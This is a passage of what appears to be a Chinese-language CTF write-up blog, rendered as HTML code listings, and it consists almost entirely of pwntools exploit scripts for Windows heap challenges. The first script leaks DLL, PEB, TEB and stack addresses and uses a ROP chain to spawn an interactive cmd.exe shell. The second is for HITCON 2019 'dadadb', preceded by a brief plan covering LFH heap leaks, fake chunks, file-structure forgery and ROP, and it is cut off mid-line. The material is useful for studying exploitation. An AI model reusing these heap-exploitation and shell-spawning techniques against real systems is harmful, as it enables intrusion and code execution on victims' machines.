class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice?\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'sword?\r\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Name it!\r\n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice?\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'destroy?\r\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice?\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'check?\r\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice?\r\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'polish?\r\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'time?\r\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'again : \r\n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'And here is your Novice village gift : '</span>)</span><br><span class="line">bin_base = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>) - <span class="number">0x1090</span></span><br><span class="line">log.success(<span class="string">'bin_base = '</span>+hex(bin_base))</span><br><span class="line"></span><br><span class="line">ptr_list = bin_base + <span class="number">0x4370</span></span><br><span class="line">key_list = bin_base + <span class="number">0x43BC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	new(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">'\x11'</span>*<span class="number">0x18</span>+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\x11'</span>*<span class="number">0x18</span>)</span><br><span class="line">free_heap_header = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#-----------------------------unlink----------------------------------</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">target = ptr_list + <span class="number">8</span></span><br><span class="line">payload = <span class="string">'\x11'</span>*<span class="number">0x18</span> + p64(free_heap_header)</span><br><span class="line">payload+= p32(target<span class="number">-4</span>) + p32(target) + <span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x28</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1337'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'target?\r\n'</span>)</span><br><span class="line">p.sendline(str(key_list+<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">4</span>,p32(ptr_list+<span class="number">0xC</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#--------------------------leak .dlls---------------------------------</span></span><br><span class="line">puts_iat = bin_base + <span class="number">0x30c8</span></span><br><span class="line">sleep_iat = bin_base + <span class="number">0x3008</span></span><br><span class="line">InitializeSListHead_iat = bin_base + <span class="number">0x3014</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">4</span>,p32(puts_iat)+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Show : '</span>)</span><br><span class="line">ucrtbase = u32(p.recv(<span class="number">4</span>)) - (<span class="number">0x759789f0</span><span class="number">-0x758C0000</span>)</span><br><span class="line">log.success(<span class="string">'ucrtbase = '</span>+hex(ucrtbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">4</span>,p32(InitializeSListHead_iat)+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Show : '</span>)</span><br><span class="line">ntdll = u32(p.recv(<span class="number">4</span>)) - (<span class="number">0x77686df0</span><span class="number">-0x77620000</span>)</span><br><span class="line">log.success(<span class="string">'ntdll = '</span> + hex(ntdll))</span><br><span class="line"><span class="comment">#---------------------leak teb,peb,stack_end---------------------------</span></span><br><span class="line">ntdll_PebLdr_addr = ntdll + <span class="number">0x120c40</span></span><br><span class="line">log.success(<span class="string">'ntdll_PebLdr_addr = '</span> + hex(ntdll_PebLdr_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">4</span>,p32(ntdll_PebLdr_addr<span class="number">-52</span>)+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Show : '</span>)</span><br><span class="line">Peb_addr = u32(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>)) - <span class="number">0x21c</span></span><br><span class="line">log.success(<span class="string">'Peb_addr = '</span> + hex(Peb_addr))</span><br><span class="line"></span><br><span class="line">Teb_addr = Peb_addr + <span class="number">0x3000</span></span><br><span class="line">log.success(<span class="string">'Teb_addr = '</span> + hex(Teb_addr))</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(len(result) &lt; <span class="number">4</span>):</span><br><span class="line">    result_length = len(result)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">4</span>,p32(Teb_addr+<span class="number">4</span>+result_length)+<span class="string">'\n'</span>)</span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Show : '</span>)</span><br><span class="line">    result += p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>)+<span class="string">'\x00'</span></span><br><span class="line"></span><br><span class="line">stack = u32(result[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">'stack = '</span>+hex(stack))</span><br><span class="line"><span class="comment">#--------------------find main_ret_addr----------------------------</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">4</span>,p32(key_list+<span class="number">3</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">14</span>,p8(<span class="number">1</span>)*<span class="number">14</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">main_ret_content = bin_base + <span class="number">0x193b</span></span><br><span class="line">log.info(<span class="string">'Start finding main_ret_addr,it will take about 30s,please wait...:)'</span>)</span><br><span class="line">main_ret_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(stack<span class="number">-0x1000</span>,stack,<span class="number">0x4</span>*<span class="number">14</span>)[::<span class="number">-1</span>]:</span><br><span class="line">    <span class="keyword">if</span>(main_ret_addr == <span class="number">0</span>):</span><br><span class="line">        payload = p32(addr)+p32(addr+<span class="number">4</span>)+p32(addr+<span class="number">8</span>)+p32(addr+<span class="number">0xc</span>)</span><br><span class="line">        payload+= p32(addr+<span class="number">0x10</span>)+p32(addr+<span class="number">0x14</span>)+p32(addr+<span class="number">0x18</span>)+p32(addr+<span class="number">0x1c</span>)</span><br><span class="line">        payload+= p32(addr+<span class="number">0x20</span>)+p32(addr+<span class="number">0x24</span>)+p32(addr+<span class="number">0x28</span>)+p32(addr+<span class="number">0x2c</span>)</span><br><span class="line">        payload+= p32(addr+<span class="number">0x30</span>)+p32(addr+<span class="number">0x34</span>)</span><br><span class="line">        edit(<span class="number">2</span>,<span class="number">0x4</span>*<span class="number">14</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">3</span>+<span class="number">14</span>):</span><br><span class="line">            show(i)</span><br><span class="line">            p.recvuntil(<span class="string">'Show : '</span>)</span><br><span class="line">            result = p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>)[:<span class="number">4</span>]</span><br><span class="line">            content = u32(result.ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span>(content == main_ret_content):</span><br><span class="line">                main_ret_addr = addr+(i<span class="number">-3</span>)*<span class="number">4</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'main_ret_addr = '</span> + hex(main_ret_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p32(main_ret_addr)+<span class="string">'cmd.exe\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#----------------------------ROP-----------------------------------</span></span><br><span class="line">rop = [</span><br><span class="line">	ucrtbase + <span class="number">0x000efda0</span>,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	ptr_list+<span class="number">0x10</span></span><br><span class="line">]</span><br><span class="line">payload = flat(rop)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">'[+] please Enter to ROP...:)'</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'chcp 65001'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'cmd.exe'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'cmd.exe'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="2019Hitcon-dadadb"><a href="#2019Hitcon-dadadb" class="headerlink" title="2019Hitcon_dadadb"></a>2019Hitcon_dadadb</h1><h2 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h2><p><code>开启LFH</code> =&gt; 利用<code>填满Userblock的方法</code>进行稳定泄露<code>heap</code> =&gt;  从<code>_HEAP</code>中的<code>_HEAP_LOCK</code>泄露<code>ntdll</code>基址 =&gt; 泄露<code>binbase</code>和<code>KERNEL32</code>等基址 =&gt; 劫持<code>listhint[0x10]</code>到<code>bss</code>上 =&gt; 在<code>bss</code>上伪造<code>fake_chunk</code> =&gt; 改写<code>user.txt</code>的<code>fp</code>并在<code>bss</code>上伪造<code>file_struct</code> =&gt; 改写<code>login</code>返回地址为<code>ropchain</code> =&gt; <code>shellcode</code>读<code>flag</code>。</p>
<h2 id="exp：-3"><a href="#exp：-3" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(user)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(key,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)	</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login(<span class="string">'orange'</span>,<span class="string">'godlike'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Enable LFH</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    add(<span class="string">"\x01lays"</span>+str(i),<span class="number">0x90</span>,<span class="string">"fuck"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fill UserBlock</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>): </span><br><span class="line">    add(<span class="string">"\x02xxrw_"</span>+str(i),<span class="number">0x90</span>,<span class="string">"xxrw"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leave a hole</span></span><br><span class="line">delete(<span class="string">"\x02xxrw_15"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fill the hole with structure</span></span><br><span class="line">add(<span class="string">"\x02xxrw_14"</span>,<span class="number">0x60</span>,<span class="string">'\x14'</span>*<span class="number">0x70</span>) </span><br><span class="line">show(<span class="string">"\x02xxrw_14"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\x14'</span>*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">heapbase = u64(p.recv(<span class="number">8</span>)) &amp; <span class="number">0xffffffffffff0000</span></span><br><span class="line"><span class="keyword">if</span> heapbase == <span class="number">0</span>:</span><br><span class="line">	log.info(<span class="string">'bad luck...try again~~~'</span>)</span><br><span class="line">	exit()</span><br><span class="line">log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">p.recvuntil(p64(<span class="number">0x90</span>))</span><br><span class="line">key = p.recvuntil(<span class="string">"\x00"</span>)[:<span class="number">-1</span>]</span><br><span class="line">log.success(<span class="string">'next_key = '</span>+key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line">add(<span class="string">'\x02xxrw_14'</span>,<span class="number">0x60</span>,<span class="string">'\x14'</span>*<span class="number">0x70</span>+p64(heapbase+<span class="number">0x10</span>))</span><br><span class="line">show(key)</span><br><span class="line">dump = p.recvuntil(<span class="string">'orange'</span>)</span><br><span class="line">log.info(<span class="string">'check...'</span>)</span><br><span class="line"><span class="keyword">if</span> p32(<span class="number">0xffeeffee</span>) <span class="keyword">not</span> <span class="keyword">in</span> dump:</span><br><span class="line">	log.info(<span class="string">'bad luck...try again~~~'</span>)</span><br><span class="line">	exit()</span><br><span class="line">log.success(<span class="string">'success!!!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readmem</span><span class="params">(addr)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> key</span><br><span class="line">	add(<span class="string">'\x02xxrw_14'</span>,<span class="number">0x60</span>,<span class="string">'\x14'</span>*<span class="number">0x70</span>+p64(addr))</span><br><span class="line">	show(key)</span><br><span class="line">	p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">	<span class="keyword">return</span> u64(p.recvuntil(<span class="string">"orange"</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">_heap_lock = readmem(heapbase+<span class="number">0x2c0</span>)</span><br><span class="line">log.success(<span class="string">'_heap_lock = '</span>+hex(_heap_lock))</span><br><span class="line">ntdll = _heap_lock + (<span class="number">0x7ffcb0ad0000</span><span class="number">-0x7ffcb0c33d30</span>) - <span class="number">0x60</span></span><br><span class="line">log.success(<span class="string">'ntdll = '</span>+hex(ntdll))</span><br><span class="line">PebLdr_addr = ntdll + (<span class="number">0x7ffcb0c353c0</span>-ntdll)</span><br><span class="line">log.success(<span class="string">'PebLdr_addr = '</span>+hex(PebLdr_addr))</span><br><span class="line"></span><br><span class="line">immol = PebLdr_addr + <span class="number">0x20</span></span><br><span class="line">ldrdata = readmem(immol)</span><br><span class="line">binentry = readmem(ldrdata + <span class="number">0x28</span>)</span><br><span class="line">binbase = binentry<span class="number">-0x1e54</span><span class="number">-0x1c</span><span class="number">-0x40</span></span><br><span class="line">log.success(<span class="string">'binbase = '</span>+hex(binbase))</span><br><span class="line"></span><br><span class="line">Peb = readmem(PebLdr_addr-(<span class="number">0xc0</span><span class="number">-0x88</span>)) - <span class="number">0x340</span></span><br><span class="line">log.success(<span class="string">'Peb = '</span>+hex(Peb))</span><br><span class="line">Teb = Peb + <span class="number">0x1000</span></span><br><span class="line">log.success(<span class="string">'Teb = '</span>+hex(Teb))</span><br><span class="line"></span><br><span class="line">IAT = binbase + <span class="number">0x3000</span></span><br><span class="line">KERNEL32_ReadFile = readmem(IAT)</span><br><span class="line">KERNEL32 = KERNEL32_ReadFile - (<span class="number">0x0007ffcafb82680</span><span class="number">-0x7ffcafb60000</span>)</span><br><span class="line">log.success(<span class="string">'KERNEL32 = '</span>+hex(KERNEL32))</span><br><span class="line"></span><br><span class="line">stack_end = readmem(Teb+<span class="number">0x8</span>)</span><br><span class="line">log.success(<span class="string">'stack_end = '</span>+hex(stack_end))</span><br><span class="line">cookie = readmem(heapbase+<span class="number">0x88</span>)</span><br><span class="line">log.success(<span class="string">'cookie = '</span>+hex(cookie))</span><br><span class="line">processparameter = readmem(Peb+<span class="number">0x20</span>)</span><br><span class="line">hstdin = readmem(processparameter+<span class="number">0x20</span>)</span><br><span class="line">log.success(<span class="string">'hstdin = '</span>+hex(hstdin))</span><br><span class="line"></span><br><span class="line">password = binbase+<span class="number">0x5648</span></span><br><span class="line">start = stack_end<span class="number">-8</span></span><br><span class="line">ret = <span class="number">0</span></span><br><span class="line"><span class="comment">#ret_addr = binbase+0x1E38</span></span><br><span class="line">ret_addr = binbase+<span class="number">0x1b60</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'Begin Brute Force...Please wait...:)'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1000</span>/<span class="number">8</span>):</span><br><span class="line">    addr = start - <span class="number">8</span>*i</span><br><span class="line">    <span class="comment">#print i</span></span><br><span class="line">    v = readmem(addr)</span><br><span class="line">    <span class="keyword">if</span> v == ret_addr :</span><br><span class="line">        ret = addr</span><br><span class="line">        log.success(<span class="string">'find!!!'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> ret == <span class="number">0</span> :</span><br><span class="line">    exit()</span><br><span class="line">log.success(<span class="string">'ret_addr = '</span>+hex(ret))</span><br><span class="line"></span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x200</span>,<span class="string">"\x02"</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x100</span>,<span class="string">"\x03"</span>*<span class="number">0x100</span>)       <span class="comment">#A</span></span><br><span class="line">add(<span class="string">"david942j"</span>,<span class="number">0xf0</span>,<span class="string">"a"</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>)  <span class="comment">#B</span></span><br><span class="line">add(<span class="string">"mehqq"</span>,<span class="number">0xf0</span>,<span class="string">"qq"</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"mehqq2"</span>,<span class="number">0xf0</span>,<span class="string">"qq2"</span>*<span class="number">0x10</span>)         <span class="comment">#D</span></span><br><span class="line">add(<span class="string">"mehqq3"</span>,<span class="number">0xf0</span>,<span class="string">"qq3"</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">"mehqq2"</span>)                      <span class="comment">#free D</span></span><br><span class="line">delete(<span class="string">"david942j"</span>)                   <span class="comment">#free B</span></span><br><span class="line"></span><br><span class="line">show(<span class="string">"lucas"</span>)</span><br><span class="line">dump = p.recvuntil(<span class="string">"b"</span>*<span class="number">8</span>)[:<span class="number">-8</span>]</span><br><span class="line">david_fd = u64(dump[<span class="number">-16</span>:<span class="number">-8</span>])</span><br><span class="line">david_bk = u64(dump[<span class="number">-8</span>:])</span><br><span class="line">header = u64(dump[<span class="number">-24</span>:<span class="number">-16</span>])</span><br><span class="line">david = david_fd - <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'david_fd = '</span>+hex(david_fd))</span><br><span class="line">log.success(<span class="string">'david_bk = '</span>+hex(david_bk))</span><br><span class="line">log.success(<span class="string">'header = '</span>+hex(header))</span><br><span class="line">log.success(<span class="string">'david = '</span>+hex(david))</span><br><span class="line"></span><br><span class="line">fakechunk = p64(<span class="number">0</span>)+p64(header)+p64(password+<span class="number">0x10</span>)+p64(david_bk)</span><br><span class="line">logout()</span><br><span class="line"><span class="comment">#forge fake chunk in front of fp</span></span><br><span class="line">fake_User = <span class="string">'orange'</span>+<span class="string">'\x00'</span>*<span class="number">2</span>+p64(header)+p64(<span class="number">0xdeadbeef</span>)+p64(password+<span class="number">0x10</span>)[:<span class="number">-2</span>]</span><br><span class="line">fake_Password = <span class="string">'godlike'</span>+<span class="string">'\x00'</span>+p64(header)+p64(password<span class="number">-0x18</span>)+p64(david)[:<span class="number">-2</span>]</span><br><span class="line">login(fake_User,fake_Password)</span><br><span class="line">add(<span 